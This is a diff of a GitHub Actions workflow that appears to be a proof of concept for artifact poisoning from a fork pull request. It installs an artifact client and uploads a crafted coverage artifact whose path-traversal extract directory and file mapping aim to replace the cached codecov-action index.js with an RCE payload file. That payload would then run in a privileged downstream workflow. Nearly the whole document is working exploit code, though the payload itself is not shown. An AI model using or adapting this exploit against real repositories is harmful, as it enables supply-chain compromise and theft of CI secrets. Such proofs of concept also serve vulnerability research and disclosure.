@@ -5,14 +5,22 @@ jobs:
   p:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v5
-      - name: attacker-controlled workflow revision
-        run: echo "FORK_PR_WORKFLOW_REVISION=attacker-modified"
-      - name: produce coverage file
-        run: mkdir -p out && echo "SF:attacker-controlled" > out/lcov.info
-      - name: upload coverage artifact
-        uses: actions/upload-artifact@v4
+      - uses: actions/checkout@v4
+      - name: attacker-controlled workflow revision (from fork PR merge ref)
+        run: |
+          echo "FORK_PR_WORKFLOW_REVISION=attacker-modified"
+          echo "REPO=${GITHUB_REPOSITORY}"
+          echo "HEADREPO=${{ github.event.pull_request.head.repo.full_name }}"
+          echo "FORK=${{ github.event.pull_request.head.repo.fork }}"
+          echo "PR_HEAD_SHA=${{ github.event.pull_request.head.sha }}"
+          echo "GITHUB_SHA=$GITHUB_SHA"
+      - name: install artifact client
+        working-directory: .github/actions/plant
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: plant crafted coverage artifact
+        uses: ./.github/actions/plant
+        env:
+          INPUT_EXTRACT_DIR: ../${{ github.event.repository.name }}/${{ github.event.repository.name }}/coverage-report-ubuntu-latest-20.x
         with:
           name: coverage-report-ubuntu-latest-20.x
-          path: out/lcov.info
-          if-no-files-found: warn
+          pairs: "poc-payload/rce-codecov.js->/home/runner/work/_actions/codecov/codecov-action/v4/dist/index.js"
